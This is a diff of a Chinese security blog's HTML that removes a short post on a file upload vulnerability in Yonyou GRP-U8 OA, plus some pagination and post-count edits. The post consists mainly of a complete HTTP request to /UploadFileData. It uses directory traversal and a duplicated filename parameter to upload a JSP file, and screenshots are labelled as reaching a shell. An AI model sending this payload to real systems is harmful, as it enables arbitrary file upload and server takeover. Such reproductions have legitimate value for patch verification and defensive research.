-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">用友GRP-U8 OA文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-09-06 13:45:45" itemprop="dateCreated datePublished" datetime="2022-09-06T13:45:45+08:00">2022-09-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-08 01:11:52" itemprop="dateModified" datetime="2022-12-08T01:11:52+08:00">2022-12-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="用友GRP-U8-OA上传"><a href="#用友GRP-U8-OA上传" class="headerlink" title="用友GRP-U8 OA上传"></a>用友GRP-U8 OA上传</h1><p>app.name=”用友GRP-U8 OA” </p>
-<h2 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h2><p><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="image.png"></p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=test.jsp&amp;filename=1.jpg HTTP/1.1</span><br><span class="line">Host: XXX.XXX.XXX:99</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------192386535332116664783811905534</span><br><span class="line">Content-Length: 263</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------192386535332116664783811905534</span><br><span class="line">Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: application/x-php</span><br><span class="line"></span><br><span class="line">&lt;%out.print(&quot;test vulnerability!&quot;);%&gt;</span><br><span class="line">-----------------------------192386535332116664783811905534--</span><br></pre></td></tr></table></figure>
-
-<p><strong>上传</strong><br><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="image.png"></p>
-<p><strong>getshell</strong><br><img src="/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="image.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/34/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><span class="page-number current">35</span><a class="page-number" href="/page/36/">36</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/36/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/34/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><span class="page-number current">35</span><a class="page-number" href="/page/36/">36</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/36/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -894,7 +1012,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
